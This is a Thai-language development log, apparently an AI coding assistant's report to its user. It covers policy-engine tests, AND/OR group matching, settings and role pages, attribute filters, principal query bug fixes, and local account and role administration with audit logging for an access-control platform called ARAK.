แก้ให้ release ที่ตัดสินไม่ได้ **ไม่ปลดอะไรเลย** พร้อมเหตุผลใน audit:
> `column rule with action ALLOW carries a condition that cannot be decided without a row (...); it releases nothing, because a release cannot be made conditional`

> นี่คือ invariant กลางของ engine — **input ที่ตัดสินไม่ได้ ต้องนับเป็นโทษของ principal เสมอ** ที่นี่เป็นจุดเดียวที่มันเคยรั่ว

---

### Q. ทดสอบ Subscription policy 45 เคส — **ไม่เจอบั๊กใหม่ เขียวหมดตั้งแต่รันแรก**

ไฟล์ใหม่ [SubscriptionPolicyTest.java](backend/dac-engine/src/test/java/com/mfec/dac/engine/SubscriptionPolicyTest.java) — **45 tests / 7 nested class**

| nested class | tests | คุมอะไร |
|---|---|---|
| `Exemptions` | 5 | exemption ที่ระบุ **team** ครอบสมาชิกด้วย · ตัวที่หมดอายุ "พอดีวินาทีนี้" = หมดแล้ว |
| `Lifecycle` | 8 | `DRAFT`/`DISABLED`/`ARCHIVED` ไม่มีผล · `validFrom` วินาทีนี้ = มีผลแล้ว · `validUntil` วินาทีนี้ = หมดแล้ว |
| `Environments` | 5 | DENY ที่ผูก env อื่น **ไม่** deny ที่นี่ (environment ขยายสิทธิ์ได้พอๆ กับที่บีบ) |
| `Gates` | 10 | DENY ที่ไม่ match = ไม่ใช่ประตู · **ALLOW ที่ไม่ match = ปิดทั้งชั้น** · sub-domain ที่ลึกกว่า override ตัวที่ตื้นกว่าได้ ไม่ใช่ทางกลับ |
| `Groups` | 10 | ฟีเจอร์ใหม่ในข้อ R |
| `Undecidable` | 3 | expression ที่ตัดสินไม่ได้ → ALLOW ไม่ให้อะไรเลย / DENY deny · คำอธิบายมีคำว่า `failing closed` |
| `NoBinding` | 4 | มีแต่ data policy → `no subscription policy binds` · policy เป็น null ข้าม · list เป็น null → deny · `effect` null อ่านเป็น ALLOW |

**พฤติกรรมที่อ่านแล้วสะดุด แต่จงใจ pin ไว้:** *exemption ที่ไปตกบน ALLOW จะ**ลบ grant ทิ้ง*** (exemption แปลว่า "ไม่ต้องอยู่ใต้ policy ตัวนี้" ไม่ใช่ "ได้รับการยกเว้นให้ผ่าน") ถ้าจะเปลี่ยนความหมายนี้ในอนาคต test จะพังให้เห็น ไม่ใช่เปลี่ยนเงียบๆ

#### ⚠️ กับดักที่เสียเวลาไปรอบหนึ่ง — Surefire + `@Nested`

`-Dtest=SubscriptionPolicyTest` **exit 0** และ `TEST-...SubscriptionPolicyTest.xml` เขียนว่า `tests="0"`
เพราะ **nested class เขียน report ของตัวเอง** (`TEST-...SubscriptionPolicyTest$Groups.xml`)

> **exit code 0 ไม่ได้พิสูจน์ว่า test ได้รัน** — ต้องนับจากไฟล์เสมอ:
> ```bash
> grep -ho 'tests="[0-9]*"' backend/dac-engine/target/surefire-reports/TEST-*.xml
> ```

**engine: 91 → 162 tests** (เดิม 91 + data policy 26 + subscription 45) เขียวทั้งหมด

---

### R. Subscription/Data policy กำหนด **by group หลายกลุ่ม AND/OR** ได้แล้ว (ผู้ใช้สั่ง)

เดิม `subjectRule.principals` เป็น **OR list** อย่างเดียว → เขียน "อยู่กลุ่ม A **หรือ** B" ได้ แต่เขียน "และต้องอยู่ C ด้วย" ไม่ได้

เพิ่ม field ที่สอง `requiredPrincipals` = **AND list** ทำงานทับบน `principals`:

| ชั้น | ไฟล์ | เปลี่ยนอะไร |
|---|---|---|
| Schema | [subjectRule.json](backend/dac-spec/src/main/resources/json/schema/entity/policy/subjectRule.json) | `requiredPrincipals: principalMatch[]` |
| Engine | [SubjectMatcher.java](backend/dac-engine/src/main/java/com/mfec/dac/engine/SubjectMatcher.java) | loop AND ก่อนเช็ค attribute + `describe()` เขียนเหตุผลลง audit ว่า**ขาดข้อไหน** |
| Test | `SubscriptionPolicyTest$Groups` | 10 tests |
| TS type | `src/generated/entity/policy/subjectRule.ts` | `yarn parse-schema` |
| Builder UI | [SubjectBuilder.tsx](frontend/app/src/pages/policies/SubjectBuilder.tsx) | แยก `PrincipalList` ออกมาแล้ว render สองครั้ง — *"Anyone who is"* / *"And who is also"* |
| ประโยคสรุป | [policyLanguage.ts](frontend/app/src/pages/policies/policyLanguage.ts) | `describePrincipal()` + clause `who is also ...` |

ครอบคลุมรูปแบบ **`(A or B) and C and D`** ซึ่งเป็นรูปที่คนเขียนจริง

#### ทำไมสองลิสต์แบน ไม่ใช่ boolean tree (บันทึกไว้จะได้ไม่ต้องเถียงใหม่)

| ทางเลือก | ทำไมไม่เอา |
|---|---|
| tree แบบ `assetSelector` (`condition`/`and`/`or`/`not`) | ต้องแก้ POJO ให้ recursive, matcher recursive, UI recursive, migrate policy ที่เก็บไว้แล้ว — จ่ายแพงเพื่อ nesting ที่ไม่มีใครเขียน |
| toggle ตัวเดียวพลิก `principals` จาก OR เป็น AND | เขียน `(A or B) and C` ไม่ได้ |
| ใช้ชื่อ `allOf` / `anyOf` | ชนกับ keyword ของ JSON Schema (เหตุผลเดียวกับที่ `assetSelector` เลี่ยงไว้ตั้งแต่แรก) |

เกินรูปนี้ไป ให้ไปใช้ `expression` ที่มีอยู่แล้ว

**UI จงใจซ่อนลิสต์ที่สองไว้จนกว่าลิสต์แรกจะมีอะไร** — ฟอร์มเปล่าที่มีสองลิสต์หน้าตาเหมือนกันคือวิธีที่คนจะพลาดความต่างระหว่างสองอันนี้
และแถวใหม่ตอนนี้ default เป็น `{ group: '' }` (เดิม `role`) ตามที่ผู้ใช้เน้นเรื่อง group

> 🔴 **jar ที่รันอยู่ตอนนี้เก่ากว่า `SubjectMatcher`** — service ที่รันค้างไว้จะยัง**ไม่**รู้จัก `requiredPrincipals` จนกว่าจะ rebuild + restart

---

### S. หน้า Settings แบ่งเป็นสามหัวข้อแบบ OpenMetadata + หน้า Application roles

ผู้ใช้สั่งหัวข้อมาตรงๆ สามอัน — ทำตามนั้นเป๊ะ เป็น card group แบบหน้า Settings ของ OM

ไฟล์ใหม่ [SettingsPage.tsx](frontend/app/src/pages/settings/SettingsPage.tsx)

| หัวข้อ | card |
|---|---|
| **Catalog & metadata** | OpenMetadata connection (admin) · Governance vocabulary · Catalog |
| **People & platform access** | **Application roles** · People & attributes · Local groups (M2, admin) |
| **Data source connections** | Registered sources (admin) · Service & build · Sync & reconcile (admin) |

card ที่ `adminOnly` ถูกกรองด้วย `hasRole('PLATFORM_ADMIN')` และหัวข้อที่ไม่เหลือ card เลยจะไม่ render

> เหตุผลที่หัวข้อ 2 กับ 3 **ต้องแยกกัน** ไม่ใช่เรื่องความสวย — *"ใครใช้ ARAK ได้"* กับ *"ใครอ่าน table ได้"* เป็นสิทธิ์คนละเรื่องที่ blast radius ต่างกันมาก console ที่เอามาไว้ด้วยกันคือ console ที่ชวนให้คนกดอันหนึ่งโดยคิดว่ากดอีกอัน

#### หน้าใหม่ — [AppRolesPage.tsx](frontend/app/src/pages/settings/AppRolesPage.tsx) ที่ `/settings/roles`

**ทุกบรรทัดใต้ "May" อ่านมาจาก `@Secured` / โค้ด authorise จริง ไม่ได้อ่านจาก requirement** และโชว์ไฟล์+บรรทัดไว้ข้างๆ ให้คนถัดไปตรวจซ้ำได้

| role | อ่านมาจาก |
|---|---|
| `PLATFORM_ADMIN` | `OpenMetadataSettingsResource.java:36` · `SyncResource.java:31` · `SourceResource.java:213` |
| `POLICY_AUTHOR` | `PolicyResource.java:187` (`authorise()` ผ่านทันที) |
| `DATA_OWNER` | `PolicyResource.java:197` — ต้องเป็น `isDescendantOrSelf` ของสิ่งที่ตัวเองเป็นเจ้าของ · scope ว่าง = ปฏิเสธ · **update authorise ทั้ง document เก่าและใหม่** จึงย้าย policy เข้ามาใน scope ตัวเองไม่ได้ |
| `AUDITOR` | `PolicyResource.java:41` (อ่านได้) — เขียนไม่ได้ |
| `REQUESTER` | `CatalogResource.java:31` — และ `QueryResource.java:83` **ไม่รับ** role นี้ |

**อ่านอย่างเดียว** เพราะ `PrincipalResource` จงใจเป็น read-only ตอน Entra เป็นเจ้าของข้อมูล — ฟอร์ม assign บนหน้านี้จะถูก sync รอบหน้าลบทิ้ง หน้าจึงบอกตรงๆ ว่า assignment จะไปอยู่ตรงไหนแทนที่จะวางปุ่มที่ไม่ทำอะไร

**Route ที่ต่อแล้ว** — `/settings` เดิม `Navigate` ไป `/settings/openmetadata` ตอนนี้เป็นหน้า hub จริง, เพิ่ม `/settings/roles`, และ [navigation.ts](frontend/app/src/layout/navigation.ts) ชี้ Settings ไปที่ `/settings`

#### 💬 ตอบคำถามผู้ใช้ — *"group/user ควรอยู่ในหน้า people เหมือนกันไหม / ควรแบ่ง Role ยังไง"*

**แยกสองหน้า เพราะเป็นคนละคำถาม แม้จะเป็น object เดียวกัน**

| | **People & attributes** (`/principals`) | **Settings → People & platform access** |
|---|---|---|
| ตอบคำถามว่า | *"มีใครบ้าง เขาถือ attribute/group อะไร"* | *"ใครควรทำอะไรใน ARAK ได้"* |
| ใครเปิด | คนเขียน policy — เปิดดู**ระหว่างเขียน** subject rule | admin — เปิดตอน onboard คนใหม่ |
| เป็นอะไร | **directory อ่านอย่างเดียว** | **การบริหาร** |

เอามารวมกันแล้วจะได้ปุ่ม "ทำให้เป็น platform admin" โผล่ให้คนที่แค่มาเปิดดูว่ามีใครอยู่ในกลุ่ม `credit-analysts` บ้าง
ทางเชื่อมที่ควรมี: ในแถวของคนใน People → ลิงก์ "Manage app roles" (เห็นเฉพาะ admin)

**การแบ่ง role ยึดแกนเดียว — "คนเขียน" ต้องไม่ใช่ "คนเปิดใช้"** (FR-9.1 `DRAFT → PENDING_APPROVAL → ACTIVE` บังคับด้วย `separationOfDuty()`)

| role | แกนที่มันแบ่ง |
|---|---|
| `POLICY_AUTHOR` | เขียนได้ทั้งองค์กร แต่เปิดใช้ของตัวเองไม่ได้ |
| `DATA_OWNER` | เหมือนกัน แต่ถูกล้อมด้วย ownership จาก OM |
| `AUDITOR` | อ่านได้หมด เขียนไม่ได้เลย — role ที่ทำให้ audit มีน้ำหนัก |
| `REQUESTER` | เห็นแค่ของตัวเอง (default ของทุกคน) |
| `PLATFORM_ADMIN` | คุมแพลตฟอร์ม **แต่ไม่ควรเป็นคนอนุมัติ policy ของตัวเอง** |

> ห้าตัวนี้ถูก fix ไว้ด้วย CHECK constraint ใน Flyway V2 แล้ว — เพิ่ม role ใหม่ต้อง migrate ไม่ใช่แก้ค่าคงที่ใน Java

---

### T. สองเรื่อง UI ที่ผู้ใช้ชี้

#### 1. icon ของ Data policy — cylinder → **`EyeOff`**

cylinder แปลว่า "database" อยู่ทุกที่ในเชลล์นี้ รวมถึงรางซ้ายที่อยู่ติดกันเลย
data policy ไม่ได้พูดถึงฐานข้อมูล มันพูดถึง**สิ่งที่ถูกปิดไว้จาก table ที่คนเข้าถึงได้อยู่แล้ว** — และ `EyeOff` แบกความหมายนี้อยู่แล้วบนผลลัพธ์หน้า Query

#### 2. 🐛 scrollbar ในรางซ้ายตอน zoom 100% — **วัดก่อน ไม่เดา**

```
12 ลิงก์ × 44px + 11 ช่อง × 2px + 12px บน + 24px ล่าง ≈ 586px
+ footer copyright ≈ 83px                              ≈ 669px
พื้นที่จริงบนจอ laptop                                  ≈ 680px
```
เกินไปไม่กี่ px → ได้ scrollbar **เต็มความสูงที่ thumb ก็เต็มความสูง** = ตัวควบคุมที่เลื่อนอะไรไม่ได้ บนลิสต์ที่เห็นครบอยู่แล้ว

สาเหตุ: ทั้งคอลัมน์เป็นกล่อง scroll เดียว → บรรทัด copyright **นับรวมเข้าไปในความสูง**ด้วย

แก้ที่ [AppShell.tsx](frontend/app/src/layout/AppShell.tsx): `<nav>` เป็น `flex-col overflow-hidden`, ให้ **`<ul>` เท่านั้นที่ scroll** (`min-h-0 flex-1 overflow-y-auto`), footer เปลี่ยนจาก `mt-auto` เป็น `shrink-0` อยู่นอกกล่อง scroll
→ จอสูงพอ = ไม่มี scrollbar เลย · จอเตี้ยจริง = bar โผล่เฉพาะตรงลิสต์ ซึ่งเป็นส่วนเดียวที่มีที่ให้ไป

---

### U. Filter ตาม attribute ในหน้า People & attributes

> ผู้ใช้สั่งไว้ตั้งแต่รอบก่อน — *"People & attributes / อยากให้สามารถ Filter ตาม attribute ได้"* — รอบนี้ทำครบทั้งสามชั้น

#### สิ่งที่ได้

| ชั้น | ของใหม่ |
|---|---|
| SQL | `PrincipalQuery.AttributeFilter(key, value)` + `attributeClause(i)` — หนึ่งเงื่อนไข = หนึ่ง `EXISTS` ต่อท้าย WHERE |
| REST | `GET /api/v1/principals?attr=department=FINANCE&attr=clearance` — `attr` ซ้ำได้ เขียนได้ทั้ง `key` และ `key=value` |
| API client | `fetchPrincipals({ attributes: [{key, value?}] })` |
| UI | ตัวเลือก key + value + ปุ่ม Add filter · ชิปของเงื่อนไขที่เปิดอยู่ (กด × ถอดได้ / Clear ล้างทั้งหมด) · **กดชื่อ key หรือค่าในการ์ด "Attributes in use" เพื่อกรองได้ทันที** |

#### สามเรื่องที่ตัดสินใจโดยอ่านจาก engine ก่อน ไม่ได้เดา

**1. เงื่อนไขหลายข้อ = AND ไม่ใช่ OR**
`subjectRule.attributes` ในฝั่ง engine เป็น AND list อยู่แล้ว → directory ที่ OR กันจะตอบคนละคำถามกับที่คนเขียน rule ถามอยู่
ผลลัพธ์ที่ขึ้นบนจอจึงอ่านได้ตรงๆ ว่า **"subject rule ที่ใส่ attribute ชุดนี้จะ match คนกลุ่มนี้"**

**2. `EXISTS` ไม่ใช่ `JOIN`** — สองเหตุผลที่เปลี่ยนคำตอบจริง
- attribute เป็น multi-value: คนที่ถือทั้ง `clearance=L1` และ `L2` ต้อง match เงื่อนไข `L2` โดย**ไม่โผล่ซ้ำสองแถว**
- เงื่อนไขหลายข้อ join กันจะกลายเป็น cross product ที่นับซ้ำ

**3. ⚠️ ไม่ไล่ตาม group membership — เพราะ engine ก็ไม่ไล่**
อ่าน [PrincipalLoader.java](backend/dac-service/src/main/java/com/mfec/dac/policy/PrincipalLoader.java) ก่อนเขียน filter: attribute ถูกโหลดจาก `principal_attribute WHERE principal_id = <ตัวเอง>` เท่านั้น ส่วน group/team มาจาก `memberships()` คนละทางกัน
→ ถ้า directory ใจดีเอา attribute ของ group มาแจกให้สมาชิก **จะโชว์คนที่ engine ไม่มีทาง match** ซึ่งคือ bug ที่คนจะเชื่อหน้าจอมากกว่าเชื่อ engine

#### รายละเอียดที่ดูเล็กแต่เลือกไว้แล้ว

- `key=` (ไม่มีค่า) อ่านเป็น "มี key นี้" ไม่ใช่ "ค่าเท่ากับสตริงว่าง" — อีกทางหนึ่งจะ match ศูนย์คนแบบเงียบๆ ซึ่งหน้าตาเหมือนคำตอบ "ไม่มีใครถือ attribute นี้" พอดี
- `attr` ที่อ่านไม่ออกถูกข้าม ไม่ตอบ 400 — filter คือวิธีมอง ไม่ใช่ form ที่ต้อง validate
- เงื่อนไขซ้ำถูกยุบเหลือข้อเดียว (`AND` กับตัวเองได้คำตอบเดิม แต่ query ยาวขึ้นเปล่าๆ)
- เพดาน **10 เงื่อนไขต่อ URL** — กัน URL เดียวประกอบ join ไม่จำกัด
- เมื่อผลลัพธ์ว่างและมี filter อยู่ ข้อความจะไม่ใช่ "Nobody matches that" เฉยๆ แต่บอกว่า *rule แบบนี้จะ match ไม่มีใคร = deny ทุกคน* ซึ่งเป็นความผิดพลาดที่มองไม่เห็นที่สุดถ้าไปเจอตอน policy active แล้ว

#### เทสต์

- `AttributeFilterTest` — **12 เทสต์ / 2 nested class** (`One` 6 · `Many` 6) เจาะที่การ parse เพราะนั่นคือจุดที่ filter เพี้ยนแบบไม่มีใครจับได้
- `PrincipalsPage.test.tsx` — **5 เทสต์** (กด key = ทั้ง key · กดค่า = ปักค่า · กดซ้ำไม่เพิ่มซ้ำ · ถอดออกได้ · ข้อความตอน match ไม่มีใคร)
- dac-service **62 เทสต์** · backend รวม **341** · frontend **11 suites / 40 tests**

---

### V. หน้า People & attributes — รื้อใหม่ + กดเข้าไปดูสมาชิกใน group ได้

> ผู้ใช้สั่ง — *"ปรับหน้านี้หน่อยไม่สวย ใช้งานยาก / แล้วจะกดเข้าไปดูว่าใน group มีใครบ้างยังไงอะ / หรือ group/user ควรอยู่ในหน้า people เหมือนกัน หรือยังไงดี แบบให้สิทธิ ระดับ app / ควรจะแบ่ง Role ยังไงดี"*

#### V.1 🐛 บั๊กที่อยู่บนจอมาตลอด — ทุกคนขึ้นว่า "0 groups"

`PRINCIPAL_COLUMNS` มี subquery เดียวชื่อ `member_count` ที่นับ **คนที่อยู่ข้างใน principal นี้** แล้วแถวของ user เอาเลขนั้นไปเขียนว่า "X groups"
→ user ทุกคน `member_count = 0` เสมอ (คนไม่มีสมาชิก) **จอเลยบอกว่าไม่มีใครอยู่ group ไหนเลย** ทั้งที่ `group_member` มีข้อมูลครบ

แก้ที่ SQL ไม่ใช่ที่ UI — เพิ่มคอลัมน์ที่สอง เพราะมันคือ **คนละคำถาม** และมีแค่ทางเดียวที่ไม่เป็นศูนย์ต่อหนึ่งแถว:

```sql
(SELECT count(*) FROM group_member gm WHERE gm.group_id  = p.id) AS member_count,  -- ใน group นี้มีใคร
(SELECT count(*) FROM group_member gg WHERE gg.member_id = p.id) AS group_count,   -- คนนี้อยู่ group ไหน
```
(เปลี่ยนชื่อ alias เป็น `gm`/`gg` ไปด้วย ของเดิม `g` ชนกับ `related()` ที่ join `group_member g`)

#### V.2 🐛 `detail()` มีโอกาส 500 — `findOne()` บน key ที่ไม่ unique

`principal` unique ที่ **`(source, username)`** ไม่ใช่ `username` → Entra มี group ชื่อ `Finance` และ OM team ชื่อ `Finance` พร้อมกันได้ แล้ว `.findOne()` จะโยน
แก้: `GET /v1/principals/{key}` รับได้ทั้ง **UUID และ username** (เทียบด้วย `UUID_FORM` regex ไม่ต้องยิง DB สองรอบ) — directory ลิงก์ด้วย **id** เสมอ ส่วน username เหลือไว้ให้พิมพ์ URL เองได้ และเติม `ORDER BY p.source` + `findFirst()`

#### V.3 หน้าใหม่ `/principals/:id` — `PrincipalDetailPage.tsx`

API `{principal, attributes, groups, members}` **มีข้อมูลครบมาตั้งแต่ต้น ขาดแค่หน้าจอ**

| ส่วน | เนื้อหา |
|---|---|
| Members (เฉพาะ group) | ตารางคนใน group กดต่อเข้าไปได้อีก · group ว่าง = บอกตรงๆ ว่า rule ที่อ้าง group นี้ = deny ทุกคน |
| Attributes | key / value / synced from — **หนึ่งแถวต่อหนึ่งค่า** (multi-value) |
| ⚠️ กล่องเตือนบน group ที่มี attribute | *attribute ของ group สมาชิก**ไม่**ได้รับสืบทอด* — engine (`PrincipalLoader`) อ่าน `principal_attribute` ของตัวคนเอง ส่วน group มาจาก `memberships()` คนละทาง → ถ้าจะให้ถึงสมาชิกต้องอ้าง **ชื่อ group** ใน subject rule ไม่ใช่ attribute ของ group |
| Member of | group ที่คนนี้สังกัด + จำนวนสมาชิกของแต่ละ group |
| Platform role | badge + ลิงก์ไป `/settings/roles` พร้อมประโยคกำกับว่า **นี่คือสิทธิ์ทำอะไรกับ ARAK ไม่ใช่สิทธิ์เห็นข้อมูล** |

#### V.4 หน้า directory รื้อใหม่ตามแบบ Catalog

| เดิม | ใหม่ |
|---|---|
| การ์ด "Attributes in use" อ้วนเต็มความกว้าง กินทั้งหน้าจอแรก | **รางซ้าย sticky `lg:w-64`** แบบเดียวกับ Catalog — หนึ่งกลุ่มต่อหนึ่ง key พับได้ |
| แถวเป็น flex ไม่ตรงคอลัมน์ | **`<table>` จริง** — Name · Kind · Source · Attributes · Membership · Platform role |
| ตัวเลือก key/value + ปุ่ม Add filter | ติ๊กในรางได้เลย · **มีจำนวนคนต่อ "ค่า"** (`FINANCE · 3`) ไม่ใช่ต่อ key อย่างเดียว |
| filter อยู่ใน state | **อยู่ใน URL** (`?q=&type=&attr=department=FINANCE`) → ส่งลิงก์ให้คนอื่นเปิดเห็นชุดเดียวกัน |
| ไม่มีทางกดเข้าไปดู group | ชื่อ = ลิงก์ · **จำนวนสมาชิกของ group = ลิงก์** (คนกดตรงนั้นก่อนเสมอ) |

`attributeKeys()` ฝั่ง backend เขียนใหม่ให้คืน `AttributeValue(value, principals)` — query แรกใช้ `row_number() OVER (PARTITION BY attr_key, source)` ตัดจำนวนค่าต่อ key, query ที่สอง aggregate ระดับ key แล้วเอามา merge กัน
เหตุผลที่ต้องมีเลขต่อค่า: *key ที่มีคนถือ 40 คน ไม่ได้บอกอะไรเลยเกี่ยวกับ rule ที่กำลังจะเขียน แต่ `clearance=L3 · 1` บอกทันที*

> รางนับ "คน" แบบ **max ข้าม source ไม่ใช่ sum** — คนเดียวถือ key เดียวกันจากสอง sync ได้ ถ้าบวกกันจะรายงานคนมากกว่าที่มีอยู่จริง

#### V.5 คำตอบเรื่อง IA: People vs Settings → Roles — **แยกกันสองหน้า ไม่รวม**

คำถามคือ *"group/user ควรอยู่ในหน้า people เหมือนกันไหม"* — คำตอบคือ **อยู่หน้าเดียวกันอยู่แล้วและถูกแล้ว** แต่ที่ต้องแยกคือ *สิทธิ์*:

| | **People & attributes** (`/principals`) | **Settings → Roles** (`/settings/roles`) |
|---|---|---|
| ตอบคำถาม | "ใครมีอยู่บ้าง ถือ attribute อะไร อยู่ group ไหน" | "ใครกดปุ่มอะไรใน ARAK ได้" |
| เจ้าของข้อมูล | **Entra / OpenMetadata** → read-only ตลอดไป (sync ทับ) | **ARAK เอง** (`app_role_assignment`) → เขียนได้ |
| ใช้ตอน | เขียน subject rule | onboard คนเข้ามาดูแลระบบ |
| ระดับ | ข้อมูลใน database | ตัวแอป |

**เหตุผลที่ห้ามรวม:** สองหน้านี้เขียนได้ไม่เท่ากัน หน้าหนึ่ง sync ทับทุกคืน อีกหน้าคือของเรา ถ้ารวมปุ่ม "Assign role" ลงในแถว directory คนจะเข้าใจว่า attribute ก็แก้ได้ด้วย — แล้วพรุ่งนี้ sync ก็ลบทิ้ง
**เชื่อมกันด้วยลิงก์แทน** — มุมขวาบนของ People เขียนว่า *Platform roles are assigned in Settings → Roles* และการ์ด Platform role ในหน้า detail ลิงก์กลับไปหน้าเดียวกัน

**ส่วน Role 5 ตัวที่มีอยู่ ไม่ต้องแบ่งใหม่** — `AppRolesPage.tsx` ประกาศไว้ครบและทุก capability มี citation ชี้ไปบรรทัดใน `PolicyResource.java` ที่บังคับจริง:

| Role | สรุปสั้น |
|---|---|
| `PLATFORM_ADMIN` | ตั้งค่า connection / sync / role — **ไม่ได้แปลว่าเห็นข้อมูล** |
| `POLICY_AUTHOR` | เขียน/แก้ policy ทุกชั้น แต่ **อนุมัติ grant เองไม่ได้** (separation of duty FR-2.6) |
| `DATA_OWNER` | เขียน local policy + ให้ grant **เฉพาะใน scope ที่ตัวเองเป็น owner ใน OM** |
| `AUDITOR` | อ่าน audit / decision log ได้หมด เขียนอะไรไม่ได้เลย |
| `REQUESTER` | default ของทุกคน — เห็น catalog + สิทธิ์ของตัวเอง |

⚠️ **ยังไม่มีหน้าจอ assign จริง** — `app_role_assignment` (พร้อม `scope_fqn`, `granted_by`, `granted_at`) มีตั้งแต่ Flyway V2 แต่ยังไม่มี write API งานนี้ **ต้องลงที่ `/settings/roles` ไม่ใช่ที่ People** ตามเส้นแบ่งข้างบน

#### เทสต์

- dac-service **62 เทสต์** (failures 0 / errors 0) · backend รวม **341**
- frontend **12 suites / 47 tests** — `PrincipalsPage.test.tsx` **8 เทสต์** (เพิ่ม: รางโชว์จำนวนคนต่อค่า · group ลิงก์ด้วยจำนวนสมาชิก · **แถว user ต้องนับ group ไม่ใช่ member** = กันบั๊ก V.1 กลับมา) · `PrincipalDetailPage.test.tsx` **4 เทสต์ (ใหม่)**

---

### W. เพิ่ม local user + assign App role ได้จาก UI แล้ว (ปิดครึ่งหนึ่งของช่องว่างข้อ 2)

> ผู้ใช้สั่ง — *"เอาเลย ให้สามารถเพิ่ม local user + App role ได้"*
> สองข้อที่ตกลงกันไว้เป็นลายลักษณ์อักษรก่อนลงมือ และทำครบทั้งคู่: **กัน admin ถอด `PLATFORM_ADMIN` ของตัวเองคนสุดท้ายทิ้ง** และ **`scope_fqn` ของ `DATA_OWNER` ต้องเลือกจาก catalog ไม่ใช่พิมพ์**

#### W.1 Migration `V10__identity_admin.sql` — ปิดบั๊กเงียบสองตัวที่ schema เดิมมีอยู่

ทั้งสองตัวอยู่มาตั้งแต่ V2 และ **มองจากข้างนอกเหมือนทำงานปกติ** ซึ่งเป็นเหตุผลว่าทำไมต้องปิดก่อนเปิดให้เขียนผ่าน UI:

| บั๊ก | ทำไมไม่มีใครเห็น | ที่แก้ |
|---|---|---|
| grant ระดับ global ซ้ำได้ไม่จำกัด | UNIQUE ของ V2 ครอบ `(principal_id, app_role, scope_fqn)` แต่ **Postgres ถือว่า NULL ไม่ชนกับ NULL** → grant ที่ `scope_fqn IS NULL` (คือ role ทุกตัวยกเว้น DATA_OWNER) `ON CONFLICT DO NOTHING` เลยไม่เคยทำงาน | `DELETE` ตัวซ้ำ แล้ว `CREATE UNIQUE INDEX app_role_assignment_global_idx ON app_role_assignment (principal_id, app_role) WHERE scope_fqn IS NULL` |
| local username ต่างกันแค่ตัวพิมพ์ | `principal` unique ที่ `(source, username)` → สร้าง `Admin` คู่กับ `admin` ได้ แล้ว `findLocalAccount().findOne()` ตอน login จะโยน | `CREATE UNIQUE INDEX principal_local_username_ci_idx ON principal (lower(username)) WHERE source = 'local' AND principal_type <> 'GROUP'` |

บวกตาราง **`audit_identity_change`** (append-only, ปิดข้อ 4 ของช่องว่างเฉพาะส่วน identity): `occurred_at, actor, action, target_principal_id, target_username, target_source, app_role, scope_fqn, reason, client_ip inet`
`action` มี CHECK — `CREATE_PRINCIPAL | ENABLE_PRINCIPAL | DISABLE_PRINCIPAL | SET_PASSWORD | GRANT_ROLE | REVOKE_ROLE`
**ไม่มี FK ไป `principal`** โดยตั้งใจ — log ต้องรอดแม้ principal ถูกลบ (พิสูจน์แล้วตอนเก็บกวาด probe account: ลบ principal ทิ้ง audit ยังอยู่ครบ)

#### W.2 `IdentityAdminStore` — กฎที่ปฏิเสธก่อนถึง database

| กฎ | ค่า |
|---|---|
| username | `[A-Za-z0-9][A-Za-z0-9._@-]{1,63}` |
| password | 10–200 ตัว และ **ห้ามเท่ากับ username** (เทียบแบบไม่สนตัวพิมพ์) |
| display name | **บังคับ** ≤ 200 |
| ชนิดที่สร้างได้ | `USER` / `SERVICE` เท่านั้น — **`GROUP` ปฏิเสธ** เพราะ group มาจาก sync |
| `DATA_OWNER` | **ต้องมี scope** |
| role อื่นทุกตัว | **ต้องไม่มี scope** — `AuthenticatedUser` รวม scope ของทุก assignment เข้าลิสต์เดียว scope ที่ติดมากับ role ระดับแพลตฟอร์มจึงอ่านเป็นอำนาจที่ไม่ได้ตั้งใจให้ |
| ลำดับการตรวจ | **ตรวจ role ก่อนสร้าง account** ไม่ใช่หลัง — ไม่งั้นได้ account มาครึ่งเดียวโดยไม่มีใครรู้ |

**Last-administrator guard** — กันทั้งสองทางที่ทำให้ล็อกตัวเองออก (`revoke` และ `disable`) นับเฉพาะคนที่ `enabled` และ **ไม่นับคนที่กำลังจะถูกเปลี่ยน**:

```java
private static void guardLastAdmin(Handle handle, UUID principalId, String message) {
  if (holdsGlobalAdmin(handle, principalId) && countGlobalAdmins(handle, principalId) == 0) {
    throw new IdentityConflictException(message);
  }
}
```

#### W.3 Endpoint ใหม่หกตัว — `PrincipalResource`, `@Secured({"PLATFORM_ADMIN"})` ทุกตัว

| Method | Path | คืน |
|---|---|---|
| `GET` | `/v1/principals/roles` | `{grants, appRoles, globalAdminCount}` |
| `POST` | `/v1/principals` | `201` + `PrincipalDetail` |
| `POST` | `/v1/principals/{id}/roles` | `{changed}` |
| `DELETE` | `/v1/principals/{id}/roles?role=&scope=&reason=` | `{changed}` |
| `POST` | `/v1/principals/{id}/enabled` | `PrincipalDetail` |
| `POST` | `/v1/principals/{id}/password` | `204` |

`clientIp` มาจาก `request.getRemoteAddr()` **ไม่ใช่ `X-Forwarded-For`** — กฎเดียวกับ `QueryResource` ห้ามเปลี่ยน
`InvalidPrincipalException → 400` · `IdentityConflictException → 409`
`inet` ย้ายออกจาก `QueryService` ไปเป็น `com.mfec.dac.audit.ClientAddress.normalise()` แล้ว (`QueryService.inet` เหลือ delegate บรรทัดเดียวเพื่อให้ `QueryServiceInetTest` ยังคุมของเดิมอยู่)

#### W.4 หน้าจอ — `/settings/roles` เขียนได้แล้ว

- **`Assignments`** ตาราง grant ทั้งหมด (Who · Role · Scope · Granted · Withdraw)
  แถวที่เป็น **`PLATFORM_ADMIN` ระดับ global คนสุดท้าย** ขึ้นคำว่า *Last administrator* แทนปุ่ม — *กันไว้ที่หน้าจอก่อนกด ไม่ใช่โยน 409 ใส่หน้าหลังกด*
- **`GrantForm`** — `PrincipalPicker` + เลือก role + (ถ้า `DATA_OWNER`) `ScopePicker` + เหตุผล
- **`AccountForm`** — username · display name · kind (`USER`/`SERVICE`) · email · first password · role เริ่มต้น
- **`pickers.tsx`** — `PrincipalPicker` / `ScopePicker` เป็น **search-and-pick ไม่ใช่ free text** เหตุผลเขียนไว้ใน doc comment: *username ที่พิมพ์ผิดคือ 404 ที่คนเห็น แต่ FQN ที่พิมพ์ผิดตัวเดียวคือ DATA_OWNER grant ที่ไม่ match อะไรเลย เงียบๆ และดูถูกต้องในทุกหน้าที่ list มันออกมา*
- **ไม่มี route guard** ที่ `/settings/roles` (ทั้งแอปยังไม่มี) → หน้านี้ **ถาม `hasRole('PLATFORM_ADMIN')` แล้ว `enabled: isAdmin` ปิด query ทิ้งไปเลย** ไม่ใช่ปล่อยให้ยิงแล้วเจอ 403
